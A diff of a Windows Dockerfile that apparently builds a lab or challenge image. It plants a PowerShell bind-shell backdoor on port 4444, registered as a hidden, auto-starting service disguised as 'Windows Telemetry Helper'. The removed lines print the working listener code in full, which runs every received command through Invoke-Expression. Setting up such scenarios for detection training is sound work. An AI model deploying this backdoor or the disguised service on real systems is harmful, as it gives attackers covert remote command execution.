@@ -7,27 +7,9 @@ SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$E
 # Plant a PowerShell bind-shell script and register a service that launches it as
 # LocalSystem. The script listens on 4444/TCP and pipes stdin/stdout of cmd.exe to
 # the socket — a classic backdoor listener.
-RUN New-Item -ItemType Directory -Path C:\ProgramData\WinTelemetry -Force | Out-Null ; \
-    Set-Content -Path C:\ProgramData\WinTelemetry\svc.ps1 -Value @' \
-        $port = 4444 \
-        $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port) \
-        $listener.Start() \
-        while ($true) { \
-            $client = $listener.AcceptTcpClient() \
-            $stream = $client.GetStream() \
-            $reader = [System.IO.StreamReader]::new($stream) \
-            $writer = [System.IO.StreamWriter]::new($stream) \
-            $writer.AutoFlush = $true \
-            while (($cmd = $reader.ReadLine()) -ne $null) { \
-                try { $out = Invoke-Expression $cmd | Out-String } catch { $out = $_.Exception.Message } \
-                $writer.WriteLine($out) \
-            } \
-            $client.Close() \
-        } \
-    '@ ; \
-    New-Service -Name 'WinTelemetrySvc' -DisplayName 'Windows Telemetry Helper' \
-        -BinaryPathName 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\WinTelemetry\svc.ps1' \
-        -StartupType Automatic
+RUN New-Item -ItemType Directory -Path C:\ProgramData\WinTelemetry -Force | Out-Null
+COPY svc.ps1 C:/ProgramData/WinTelemetry/svc.ps1
+RUN New-Service -Name 'WinTelemetrySvc' -DisplayName 'Windows Telemetry Helper' -BinaryPathName 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\WinTelemetry\svc.ps1' -StartupType Automatic
 # Firewall is disabled in the base image; no explicit allow rule required.
 
 COPY verify.ps1 C:/verify/verify.ps1
